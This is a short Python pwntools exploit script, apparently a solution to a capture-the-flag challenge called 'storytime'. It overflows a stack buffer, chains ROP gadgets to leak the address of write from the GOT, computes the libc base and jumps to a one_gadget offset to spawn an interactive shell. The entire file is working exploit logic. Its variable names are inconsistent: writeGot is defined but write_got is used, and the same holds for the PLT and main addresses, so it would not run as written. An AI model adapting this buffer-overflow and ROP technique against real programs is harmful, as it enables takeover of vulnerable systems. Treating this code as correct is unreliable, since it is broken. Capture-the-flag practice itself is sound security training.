'''
Author: Samrito
Date: 2022-01-27 21:50:02
LastEditors: Samrito
LastEditTime: 2022-01-27 22:38:27
'''
from pwn import *

io = process(argv=['./storytime'])
elf = ELF('./storytime')
libc = ELF('./libc.so.6')

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'

mainAddr = elf.symbols['main']
writePlt = elf.plt['write']
writeGot = elf.got['write']

pop_rdi = 0x0400703
pop_rsi_r15 = 0x400701

payload = flat([
    b'@' * (0x30 + 8), pop_rdi, 1, pop_rsi_r15, write_got, 0, write_plt,
    main_addr
])

io.recvuntil(b'Tell me a story: \n')
io.sendline(payload)

res = io.recv(6).ljust(8, b'\x00')
writer_addr = u64(res)

base_addr = writer_addr - libc.symbols['write']
gadget_libc_addr = 0xf02a4
gadget_addr = base_addr + gadget_libc_addr
payload = flat([b'@' * (0x30 + 8), gadget_addr])

io.recvuntil(b'Tell me a story: \n')
io.sendline(payload)

io.interactive()